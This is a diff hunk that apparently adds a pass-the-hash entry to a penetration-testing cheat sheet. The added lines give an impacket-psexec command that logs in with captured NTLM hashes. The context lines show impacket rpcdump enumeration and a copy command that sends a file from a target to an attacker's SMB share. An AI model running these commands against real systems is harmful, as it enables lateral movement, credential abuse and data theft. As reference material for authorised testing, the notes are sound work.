@@ -1870,6 +1870,11 @@ copy C:\path\to\file\on\box //Lin_IP_here/share_here/file_here
 /path/to/impacket/rpcdump -port 135 IP_here
 /path/to/impacket/rpcdump -port 139 IP_here
 /path/to/impacket/rpcdump -port 445 IP_here
+
+
+# pass-the-hash
+## LM : aad3b435b51404eeaad3b435b51404ee
+impacket-psexec domain_here/user_name_here@IP_here -hashes LM_hash_here:NTLM_hash_here
 ```
 
 
